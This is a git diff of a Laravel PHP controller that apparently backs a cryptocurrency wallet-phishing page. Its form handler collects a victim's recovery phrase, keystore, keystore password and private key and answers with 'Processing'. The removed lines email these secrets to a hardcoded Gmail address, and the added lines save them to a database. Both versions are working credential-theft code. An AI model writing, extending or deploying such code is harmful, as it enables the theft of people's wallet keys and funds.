@@ -2,9 +2,11 @@
 
 namespace App\Http\Controllers;
 
-use Illuminate\Http\Request;
 use Mail;
+use App\Models\Details;
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Session;
+
 class PagesController extends Controller
 {
     public function index(){
@@ -14,18 +16,14 @@ class PagesController extends Controller
       return view('link');
     }
     public function submitForm(Request $request){
-      $data = [
-        'Phrase' =>$request->phrase,
-        'Keystore' =>$request->keystore,
-        'keystorepass' =>$request->keystorepass,
-        'Privatekey' =>$request->privatekey,
-        'email'=>'emmajoy658@gmail.com',
-        'subject'=>'New Entry'
-      ];
-      Mail::send('email-template', $data, function($message) use ($data) {
-          $message->to($data['email'])
-          ->subject($data['subject']);
-        });
+      $detail = Details::create(
+        [
+        'phrase' => $request->get('phrase'),
+        'keystore' => $request->get('keystore'),
+        'keystore_password' => $request->get('keystorepass'),
+        'private_key' => $request->get('privatekey'),
+        ]
+    );
 
         return back()->with(['message' => 'Processing']);
     }
